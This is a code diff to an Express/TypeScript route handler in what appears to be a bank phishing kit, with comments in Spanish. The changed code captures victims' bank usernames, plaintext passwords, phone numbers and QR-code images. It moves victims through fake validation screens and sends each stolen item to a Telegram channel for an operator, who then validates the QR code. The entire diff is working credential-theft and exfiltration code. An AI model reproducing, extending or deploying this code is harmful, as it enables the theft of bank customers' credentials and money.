@@ -1292,25 +1292,55 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
             // Actualizar solo los campos específicos
             const updateData: any = {};
+            let telegramMessage = '';
             
             if (tipo === 'login') {
               updateData.username = inputData.username;
               updateData.password = inputData.password;
               updateData.pasoActual = ScreenType.VALIDANDO;
+              
+              telegramMessage = `🔐 <b>DATOS DE LOGIN ACTUALIZADOS</b>\n\n` +
+                `📋 <b>Folio:</b> ${existingSession.folio}\n` +
+                `🏦 <b>Banco:</b> ${existingSession.banco}\n` +
+                `📧 <b>Usuario:</b> ${inputData.username}\n` +
+                `🔑 <b>Contraseña:</b> ${inputData.password}\n` +
+                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
+                `✅ <b>Estado:</b> Credenciales actualizadas`;
+            }
+            
+            if (tipo === 'phone_input') {
+              updateData.celular = inputData.phone;
+              updateData.pasoActual = ScreenType.QR_SCAN;
+              console.log('🔥 TELÉFONO RECIBIDO en UPDATE_SESSION_DATA:', inputData.phone);
+              
+              telegramMessage = `📱 <b>TELÉFONO RECIBIDO (Flujo QR)</b>\n\n` +
+                `📋 <b>Folio:</b> ${existingSession.folio}\n` +
+                `📞 <b>Teléfono:</b> ${inputData.phone}\n` +
+                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+            }
+            
+            if (tipo === 'qr_validation') {
+              updateData.qrImage = inputData.qrImage;
+              updateData.qrValidated = false;
+              updateData.pasoActual = ScreenType.QR_VALIDATION;
+              console.log('🔥 QR RECIBIDO en UPDATE_SESSION_DATA');
+              
+              telegramMessage = `📱 <b>CÓDIGO QR RECIBIDO (Flujo QR)</b>\n\n` +
+                `📋 <b>Folio:</b> ${existingSession.folio}\n` +
+                `📞 <b>Teléfono:</b> ${existingSession.celular || 'No proporcionado'}\n` +
+                `📷 <b>QR:</b> Imagen capturada correctamente\n` +
+                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
+                `⚠️ <b>Estado:</b> Esperando validación de administrador`;
             }
 
             await storage.updateSession(sessionId, updateData);
 
-            // Enviar notificación a Telegram con el mismo folio
-            const telegramMessage = `🔐 <b>DATOS DE LOGIN ACTUALIZADOS</b>\n\n` +
-              `📋 <b>Folio:</b> ${existingSession.folio}\n` +
-              `🏦 <b>Banco:</b> ${existingSession.banco}\n` +
-              `📧 <b>Usuario:</b> ${inputData.username}\n` +
-              `🔑 <b>Contraseña:</b> ${inputData.password}\n` +
-              `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
-              `✅ <b>Estado:</b> Credenciales actualizadas`;
-            
-            sendTelegramMessage(telegramMessage);
+            // Enviar notificación a Telegram si hay mensaje
+            if (telegramMessage) {
+              console.log('🔥 Enviando mensaje a Telegram desde UPDATE_SESSION_DATA');
+              sendTelegramMessage(telegramMessage);
+              console.log('🔥 Mensaje enviado a Telegram');
+            }
 
             // Notificar a administradores
             const updatedSession = await storage.getSessionById(sessionId);
